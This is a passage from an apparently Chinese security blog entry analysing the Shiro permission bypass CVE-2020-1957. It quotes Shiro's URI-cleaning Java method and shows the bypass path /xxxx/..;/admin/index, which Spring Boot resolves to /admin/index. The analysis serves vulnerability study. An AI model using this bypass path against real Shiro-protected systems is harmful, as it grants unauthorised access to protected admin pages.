<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">decodeAndCleanUriString</span><span class="params">(HttpServletRequest request, String uri)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	uri = decodeRequestString(request, uri);</span><br><span class="line">	<span class="keyword">int</span> semicolonIndex = uri.indexOf(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">	<span class="keyword">return</span> (semicolonIndex != -<span class="number">1</span> ? uri.substring(<span class="number">0</span>, semicolonIndex) : uri);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>而最终转到<code>springboot</code>的<code>uri</code>却是原本的<code>/xxxx/..;/admin/index</code> 而<code>springboot</code>的处理逻辑会得到<code>/admin/index</code> 从而成功绕过</p>
<hr>
<p>参考文章</p>
<p>[shiro权限绕过漏洞分析(cve-2020-1957)](</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
        <tag>反序列化</tag>
        <tag>shiro</tag>
      </tags>
  </entry>
</search>
